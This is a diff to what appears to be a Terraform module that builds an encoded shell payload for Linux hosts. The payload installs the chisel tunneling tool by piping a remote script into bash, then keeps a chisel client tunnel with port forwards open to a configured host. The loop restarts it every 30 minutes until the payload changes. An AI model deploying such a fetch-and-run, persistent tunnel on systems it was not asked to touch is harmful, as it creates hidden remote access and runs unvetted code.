@@ -6,21 +6,29 @@ locals {
         for port in var.inputs["port_forwards"]: "${port.src_port}:${port.dst_ip}:${port.dst_port}"
     ])
     payload = <<-EOT
-    killall -9 chisel
-    truncate -s 0 /tmp/chisel.log
-    log "checking for chisel..."
-    while ! command -v chisel; do
-        log "chisel not found - installing"
-        curl https://i.jpillora.com/chisel! | bash
-        sleep 10
+    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
+    while true; do
+        killall -9 chisel
+        truncate -s 0 /tmp/chisel.log
+        log "checking for chisel..."
+        while ! command -v chisel; do
+            log "chisel not found - installing"
+            curl https://i.jpillora.com/chisel! | bash
+            sleep 10
+        done
+        log "chisel: $(command -v  chisel)"
+        /usr/local/bin/chisel client -v ${local.host_ip}:${local.host_port} ${local.port_forwards} > /tmp/chisel.log 2>&1 &
+        log "listener started..."
+        log 'waiting 30 minutes...';
+        sleep 1800
+        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
+        if [ "$CHECK_HASH" != "$START_HASH" ]; then
+            log "payload update detected - exiting loop"
+            break
+        else
+            log "restarting loop..."
+        fi
     done
-    log "chisel: $(command -v  chisel)"
-    /usr/local/bin/chisel client -v ${local.host_ip}:${local.host_port} ${local.port_forwards} > /tmp/chisel.log 2>&1 &
-    log "waiting 10 minutes..."
-    sleep 600
-    log "wait done - terminating"
-    killall -9 chisel
-    log "done"
     EOT
 
     base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
